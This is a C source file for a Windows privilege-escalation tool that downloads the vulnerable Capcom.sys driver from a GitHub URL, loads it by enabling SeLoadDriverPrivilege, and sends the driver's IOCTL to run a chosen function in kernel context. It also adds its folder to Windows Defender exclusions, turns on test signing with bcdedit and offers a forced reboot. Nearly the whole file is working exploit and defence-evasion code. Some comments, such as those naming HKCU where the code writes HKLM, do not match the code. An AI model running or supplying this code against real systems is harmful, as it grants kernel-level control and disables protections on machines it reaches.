/*
Reference:
https://github.com/hatRiot/token-priv
https://github.com/TarlogicSecurity/EoPLoadDriver

Compile with:
x86_64-w64-mingw32-gcc -o SeLoadDriverPrivilege.exe SeLoadDriverPrivilege.c -lwininet -ladvapi32 -luser32

Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.

Modified to compile with x86_64-w64-mingw32-gcc and download Capcom.sys automatically.

The program will:
1. Download Capcom.sys from GitHub to current directory
2. Add required registry keys automatically
3. Load the driver into the kernel
*/

#include <windows.h>
#include <wininet.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// For MinGW compatibility
#ifndef SE_PRIVILEGE_ENABLED
#define SE_PRIVILEGE_ENABLED 0x00000002L
#endif
#ifndef SE_PRIVILEGE_ENABLED_BY_DEFAULT
#define SE_PRIVILEGE_ENABLED_BY_DEFAULT 0x00000001L
#endif
#ifndef SE_PRIVILEGE_REMOVED
#define SE_PRIVILEGE_REMOVED 0x00000004L
#endif
#ifndef SE_PRIVILEGE_USED_FOR_ACCESS
#define SE_PRIVILEGE_USED_FOR_ACCESS 0x80000000L
#endif

// Function prototypes for dynamic loading
typedef NTSTATUS(NTAPI *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
typedef VOID(NTAPI *RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);
typedef ULONG(NTAPI *RTL_NTSTATUS_TO_DOS_ERROR)(NTSTATUS Status);

BOOL DownloadCapcomDriver(const char* url)
{
    HINTERNET hInternet, hConnect;
    DWORD dwBytesRead, dwBytesWritten;
    BYTE buffer[8192];
    HANDLE hFile;
    BOOL result = FALSE;
    
    printf("[+] Downloading Capcom.sys from: %s\n", url);
    
    // Initialize WinINet
    hInternet = InternetOpenA("DriverLoader/1.0", 
                             INTERNET_OPEN_TYPE_PRECONFIG, 
                             NULL, NULL, 0);
    if (!hInternet) {
        printf("[-] Failed to initialize internet connection\n");
        return FALSE;
    }
    
    // Open URL
    hConnect = InternetOpenUrlA(hInternet, 
                               url,
                               NULL, 0, 
                               INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        printf("[-] Failed to open URL\n");
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    
    // Create local file
    hFile = CreateFileA("Capcom.sys", 
                       GENERIC_WRITE, 
                       0, NULL, 
                       CREATE_ALWAYS, 
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create Capcom.sys file\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    
    // Download file
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &dwBytesRead) && dwBytesRead > 0) {
        if (!WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL) || 
            dwBytesWritten != dwBytesRead) {
            printf("[-] Failed to write to file\n");
            goto cleanup;
        }
    }
    
    printf("[+] Successfully downloaded Capcom.sys\n");
    result = TRUE;
    
cleanup:
    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return result;
}

BOOL SetupRegistryKeys()
{
    HKEY hKey;
    LONG result;
    DWORD dwValue;
    WCHAR currentDir[MAX_PATH];
    WCHAR driverPath[MAX_PATH];
    
    printf("[+] Creating registry keys for Capcom driver...\n");
    
    // Get full current directory path
    WCHAR fullPath[MAX_PATH];
    DWORD pathLen = GetCurrentDirectoryW(MAX_PATH, fullPath);
    if (pathLen == 0) {
        printf("[-] Failed to get current directory: error %lu\n", GetLastError());
        return FALSE;
    }
    
    // Get absolute path and ensure proper format for driver loading
    DWORD len = GetFullPathNameW(fullPath, MAX_PATH, currentDir, NULL);
    if (len == 0) {
        printf("[-] Failed to get full path: error %lu\n", GetLastError());
        return FALSE;
    }
    
    // Build NT-style path format required by driver loader
    swprintf(driverPath, MAX_PATH, L"\\??\\%ls\\Capcom.sys", currentDir);
    
    // Convert any remaining backslashes to forward slashes
    WCHAR *p = driverPath;
    while (*p) {
        if (*p == L'\\') {
            if (*(p+1) == L'\\') p++; // Skip if it's already a double backslash
            else *p = L'\\';
        }
        p++;
    }
    
    printf("[+] Creating registry key: HKCU\\System\\CurrentControlSet\\CAPCOM\n");
    
    // Handle registry redirection for 64-bit Windows
    DWORD flags = KEY_ALL_ACCESS;
#ifdef _WIN64
    flags |= KEY_WOW64_64KEY;
#endif

    // Create/Open registry key HKLM\System\CurrentControlSet\Services\CAPCOM
    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                            L"System\\CurrentControlSet\\Services\\CAPCOM",
                            0, NULL,
                            REG_OPTION_NON_VOLATILE,
                            flags,
                            NULL,
                            &hKey,
                            NULL);
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to create registry key (Error: %ld)\n", result);
        return FALSE;
    }
    
    printf("[+] Setting ImagePath value: %ws\n", driverPath);
    
    // Set ImagePath value (REG_SZ)
    // Equivalent to: reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\path\Capcom.sys"
    result = RegSetValueExW(hKey,
                           L"ImagePath",
                           0,
                           REG_SZ,
                           (BYTE*)driverPath,
                           (wcslen(driverPath) + 1) * sizeof(WCHAR));
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set ImagePath registry value (Error: %ld)\n", result);
        RegCloseKey(hKey);
        return FALSE;
    }
    
    printf("[+] Setting Type value: 1 (REG_DWORD)\n");
    
    // Set Type value (REG_DWORD = 1)
    // Equivalent to: reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
    dwValue = 1;
    result = RegSetValueExW(hKey,
                           L"Type",
                           0,
                           REG_DWORD,
                           (BYTE*)&dwValue,
                           sizeof(DWORD));
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set Type registry value (Error: %ld)\n", result);
        RegCloseKey(hKey);
        return FALSE;
    }
    
    RegCloseKey(hKey);
    
    wprintf(L"[+] Registry keys created successfully!\n");
    wprintf(L"    Key: HKCU\\System\\CurrentControlSet\\CAPCOM\n");
    wprintf(L"    ImagePath (REG_SZ): %ls\n", driverPath);
    wprintf(L"    Type (REG_DWORD): 1\n");
    wprintf(L"[+] These are equivalent to the manual commands:\n");
    wprintf(L"    reg add hkcu\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"%ls\"\n", driverPath);
    wprintf(L"    reg add hkcu\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1\n");
    
    return TRUE;
}

LPWSTR getUserSid(HANDLE hToken)
{
    DWORD dwBufferSize = 0;
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize) &&
        (GetLastError() != ERROR_INSUFFICIENT_BUFFER))
    {
        wprintf(L"GetTokenInformation failed, error: %d\n", GetLastError());
        return NULL;
    }

    PTOKEN_USER pUserToken = (PTOKEN_USER)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        dwBufferSize);

    if (pUserToken == NULL) {
        return NULL;
    }

    if (!GetTokenInformation(hToken, TokenUser, pUserToken, dwBufferSize, &dwBufferSize))
    {
        HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
        return NULL;
    }

    if (!IsValidSid(pUserToken->User.Sid))
    {
        wprintf(L"The owner SID is invalid.\n");
        HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
        return NULL;
    }

    LPWSTR sidString;
    ConvertSidToStringSidW(pUserToken->User.Sid, &sidString);
    HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
    return sidString;
}

ULONG LoadDriver(HANDLE hToken)
{
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    DWORD lastError;
    WCHAR servicePath[MAX_PATH];
    WCHAR driverPath[MAX_PATH];
    
    // Get current directory and build paths
    if (!GetFullPathNameW(L"Capcom.sys", MAX_PATH, driverPath, NULL)) {
        printf("[-] Failed to get driver path: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Driver path: %ls\n", driverPath);
    
    // Create temporary service
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        printf("[-] Failed to open SC Manager: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Creating temporary service...\n");
    hService = CreateServiceW(hSCManager, 
                            L"Capcom",
                            L"Capcom",
                            SERVICE_ALL_ACCESS,
                            SERVICE_KERNEL_DRIVER,
                            SERVICE_DEMAND_START,
                            SERVICE_ERROR_NORMAL,
                            driverPath,
                            NULL, NULL, NULL, NULL, NULL);

    if (!hService) {
        lastError = GetLastError();
        if (lastError == ERROR_SERVICE_EXISTS) {
            printf("[*] Service already exists, trying to open it...\n");
            hService = OpenServiceW(hSCManager, L"Capcom", SERVICE_ALL_ACCESS);
            if (!hService) {
                printf("[-] Failed to open existing service: %lu\n", GetLastError());
                CloseServiceHandle(hSCManager);
                return 1;
            }
        } else {
            printf("[-] Failed to create service: %lu\n", lastError);
            CloseServiceHandle(hSCManager);
            return 1;
        }
    }

    printf("[+] Starting driver...\n");
    if (!StartServiceW(hService, 0, NULL)) {
        lastError = GetLastError();
        if (lastError != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[-] StartService failed: %lu\n", lastError);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return lastError;
        }
        printf("[*] Service already running\n");
    }

    printf("[+] Driver loaded successfully!\n");
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int IsTokenSystem(HANDLE tok)
{
    DWORD Size, UserSize, DomainSize;
    SID *sid;
    SID_NAME_USE SidType;
    WCHAR UserName[64], DomainName[64];
    TOKEN_USER *User;
    
    Size = 0;
    GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
    if (!Size)
        return 0;

    User = (TOKEN_USER *)malloc(Size);
    if (!User) return 0;
    
    GetTokenInformation(tok, TokenUser, User, Size, &Size);
    if (!Size) {
        free(User);
        return 0;
    }
    
    Size = GetLengthSid(User->User.Sid);
    if (!Size) {
        free(User);
        return 0;
    }
    
    sid = (SID *)malloc(Size);
    if (!sid) {
        free(User);
        return 0;
    }

    CopySid(Size, sid, User->User.Sid);
    UserSize = 63;
    DomainSize = 63;
    LookupAccountSidW(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
    
    wprintf(L"whoami:\n%ls\\%ls\n", DomainName, UserName);
    
    free(sid);
    free(User);
    
    if (!_wcsicmp(UserName, L"SYSTEM"))
        return 0;
    return 1;
}

VOID RetPrivDwordAttributesToStr(DWORD attributes, LPWSTR szAttrbutes)
{
    int len = 0;
    size_t remaining_size = 1024; // Corresponds to lpszAttrbutes in GetTokenPrivilege
    szAttrbutes[0] = 0;
    
    if (attributes & SE_PRIVILEGE_ENABLED)
        len += swprintf(szAttrbutes + len, remaining_size - len, L"Enabled ");
    if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
        len += swprintf(szAttrbutes + len, remaining_size - len, L"Enabled by default ");
    if (attributes & SE_PRIVILEGE_REMOVED)
        len += swprintf(szAttrbutes + len, remaining_size - len, L"Removed ");
    if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
        len += swprintf(szAttrbutes + len, remaining_size - len, L"Used for access ");
    if (szAttrbutes[0] == 0)
        swprintf(szAttrbutes, remaining_size, L"Disabled");
    return;
}

int GetTokenPrivilege(HANDLE tok)
{
    PTOKEN_PRIVILEGES ppriv = NULL;
    DWORD dwRet = 0;
    
    GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
    if (!dwRet)
        return 0;
        
    ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
    if (!ppriv) return 0;
    
    GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
    printf("\nwhoami /priv\n");
    
    for (DWORD i = 0; i < ppriv->PrivilegeCount; i++)
    {
        WCHAR lpszPriv[MAX_PATH] = { 0 };
        DWORD dwPrivLen = MAX_PATH;
        BOOL n = LookupPrivilegeNameW(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwPrivLen);
        wprintf(L"%-50ls", lpszPriv);
        WCHAR lpszAttrbutes[1024] = { 0 };
        RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
        wprintf(L"%ls\n", lpszAttrbutes);
    }
    
    free(ppriv);
    return 1;
}

BOOL EnablePriv(HANDLE hToken, LPCWSTR priv)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(NULL, priv, &luid))
    {
        printf("[-] LookupPrivilegeValue error\n");
        return FALSE;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges error for %ls: %lu\n", priv, GetLastError());
        return FALSE;
    }

    // Check if the privilege was actually enabled
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        if (wcscmp(priv, L"SeLoadDriverPrivilege") == 0) {
            printf("[-] Failed to enable %ls - not held by process\n", priv);
            return FALSE;
        }
        return TRUE; // Silently continue if non-critical privilege fails
    }

    if (wcscmp(priv, L"SeLoadDriverPrivilege") == 0) {
        printf("[+] %ls enabled successfully\n", priv);
    }
    return TRUE;
}

// Payload function to be executed by the driver in kernel mode.
// This will launch calc.exe in the user's session.
void RunCalc()
{
    // Use full path to calc.exe to avoid ERROR_FILE_NOT_FOUND
    WinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);
}

#define CAPCOM_IOCTL 0xAA013044

#pragma pack(push, 1)
typedef struct {
    DWORD64 Tag;  // Must be 0xDEADBEEFDEADBEEF
    void* Function;  // Function to execute
} EXPLOIT_BUFFER;

// Triggers the vulnerability in Capcom.sys to execute our payload.
BOOL TriggerExploit()
{
    HANDLE hDevice;
    DWORD dwBytesReturned;

    printf("[+] Opening handle to Capcom device... \\\\.\\Htsysm72FB\n");
    
    // Device name for Capcom driver
    hDevice = CreateFileA("\\\\.\\Htsysm72FB",
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open handle to device (Error: %ld)\n", GetLastError());
        printf("[-] Make sure the driver is loaded correctly.\n");
        return FALSE;
    }

    printf("[+] Device handle opened successfully: 0x%p\n", hDevice);

    // Setup the exploit buffer exactly as in reference
    EXPLOIT_BUFFER payload = {0};
    payload.Tag = 0xDEADBEEFDEADBEEF;  // Magic value required by driver
    payload.Function = RunCalc;

    printf("[+] Payload function address: 0x%p\n", payload.Function);

    // Send IOCTL exactly as in reference code
    DWORD OutBuffer = 0;
    if (!DeviceIoControl(hDevice,
                        CAPCOM_IOCTL,
                        &payload,
                        sizeof(payload),
                        &OutBuffer,
                        sizeof(OutBuffer),
                        &dwBytesReturned,
                        NULL))
    {
        printf("[-] Failed to send IOCTL (Error: %ld)\n", GetLastError());
        CloseHandle(hDevice);
        return FALSE;
    }

    printf("[+] IOCTL sent successfully!\n");
    printf("[+] If exploit was successful, calc.exe should be running.\n");

    CloseHandle(hDevice);
    return TRUE;
}

// Attempt to disable Windows Defender
BOOL DisableWindowsDefender() {
    printf("[*] Adding current directory to Windows Defender exclusions...\n");
    
    HKEY hKey;
    WCHAR currentDir[MAX_PATH];
    LONG result;

    // Get current directory
    if (!GetCurrentDirectoryW(MAX_PATH, currentDir)) {
        printf("[-] Failed to get current directory\n");
        return FALSE;
    }

    // Open/Create Windows Defender exclusions key with full access
    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                            L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
                            0, NULL,
                            REG_OPTION_NON_VOLATILE,
                            KEY_ALL_ACCESS,
                            NULL,
                            &hKey,
                            NULL);

    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to create/open Windows Defender exclusions key\n");
        return FALSE;
    }

    // Add current directory to exclusions
    DWORD value = 0;
    result = RegSetValueExW(hKey,
                           currentDir,
                           0,
                           REG_DWORD,
                           (BYTE*)&value,
                           sizeof(DWORD));

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to add directory to exclusions\n");
        return FALSE;
    }

    printf("[+] Added %ls to Windows Defender exclusions\n", currentDir);
    return TRUE;
}

// Attempt to disable DSE
BOOL DisableDSE() {
    printf("[*] Attempting to disable Driver Signature Enforcement...\n");
    
    // Try to disable DSE using bcdedit
    CHAR cmd[] = "bcdedit /set testsigning on >nul 2>&1";
    if (system(cmd) != 0) {
        printf("[-] Failed to disable DSE. Make sure you're running as administrator\n");
        return FALSE;
    }
    
    printf("[+] DSE should be disabled after restart\n");
    printf("[*] System needs to be restarted for changes to take effect\n");
    
    // Ask user if they want to restart now
    printf("[?] Do you want to restart the system now? (y/n): ");
    char response;
    scanf(" %c", &response);
    if (response == 'y' || response == 'Y') {
        printf("[*] Restarting system in 5 seconds...\n");
        system("shutdown /r /t 5 /f");
        exit(0);
    }
    
    return TRUE;
}

int main(int argc, char* argv[])
{
    HANDLE hToken;
    const char* defaultUrl = "https://github.com/josemlwdf/random_scripts/raw/refs/heads/main/Capcom.sys";
    const char* driverUrl = defaultUrl;
    
    printf("=== Capcom Driver Loader & Exploit ===\n");
    
    // Check if driver service is already installed
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        printf("[-] Failed to open SC Manager: %lu\n", GetLastError());
        return 1;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, L"Capcom", SERVICE_QUERY_STATUS);
    BOOL driverInstalled = (hService != NULL);
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    if (driverInstalled) {
        printf("[*] Capcom driver is already installed, proceeding to exploit\n");
    } else {
        // Check if driver file exists in current directory
        HANDLE hFile = CreateFileA("Capcom.sys", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            printf("[*] Found Capcom.sys in current directory, will install it\n");
            CloseHandle(hFile);
        } else {
            printf("[*] Downloading Capcom driver...\n");
            if (!DownloadCapcomDriver(driverUrl)) {
                printf("[-] Failed to download driver\n");
                return 1;
            }
        }
    }
    
    // Get process token with all necessary access rights
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_ALL_ACCESS, &hToken)) {
        printf("[-] OpenProcessToken error: %lu\n", GetLastError());
        return 1;
    }

    // Enable SeLoadDriverPrivilege first and verify it's enabled
    if (!EnablePriv(hToken, L"SeLoadDriverPrivilege")) {
        printf("[-] Critical privilege SeLoadDriverPrivilege could not be enabled\n");
        CloseHandle(hToken);
        return 1;
    }

    // Enable other privileges - continue if they fail
    EnablePriv(hToken, L"SeSecurityPrivilege");     // Optional privilege
    EnablePriv(hToken, L"SeTakeOwnershipPrivilege");  // Optional privilege
    EnablePriv(hToken, L"SeBackupPrivilege");         // Optional privilege
    EnablePriv(hToken, L"SeRestorePrivilege");        // Optional privilege

    // Show current user and privileges to verify
    IsTokenSystem(hToken);
    GetTokenPrivilege(hToken);

    // Try to disable security features
    DisableWindowsDefender();
    if (!DisableDSE()) {
        printf("[!] Warning: Failed to disable DSE, exploit may fail\n");
        printf("[!] Make sure you're running as Administrator\n");
    }
    
    printf("[+] Starting driver loading process...\n");

    // If a parameter is passed, use it as the URL
    if (argc > 1 && argv[1] && strlen(argv[1]) > 0) {
        driverUrl = argv[1];
        printf("[*] Using user-supplied driver URL: %s\n", driverUrl);
    } else {
        printf("[*] Using default driver URL: %s\n", driverUrl);
    }
    
    // Skip file and registry operations if driver is already installed
    
    ULONG result = 0;
    
    // Only setup and load if driver isn't already installed
    if (!driverInstalled) {
        // Setup registry keys
        if (!SetupRegistryKeys()) {
            printf("[-] Failed to setup registry keys\n");
            CloseHandle(hToken);
            return 1;
        }
        
        // Load the driver
        result = LoadDriver(hToken);
        if (result != 0) {
            printf("[-] Driver loading failed with error: %lu\n", result);
            CloseHandle(hToken);
            return result;
        }
    }
    
    CloseHandle(hToken);
    
    if (result == 0) {
        printf("[+] Driver loaded successfully!\n");
        printf("[+] Driver should now be loaded in kernel space.\n");
        
        // Exploit the loaded driver to run calc.exe
        printf("\n[+] Now attempting to exploit the driver to run calc.exe...\n");
        if (!TriggerExploit()) {
            printf("[-] Exploit failed.\n");
            result = 1; // Indicate failure
        } else {
            printf("[+] Exploit finished.\n");
        }
    } else {
        printf("[-] Driver loading failed with error: %lu\n", result);
    }
    
    if (result == 0) {
        printf("\n[+] All operations completed successfully!\n");
    }
    
    return result;
}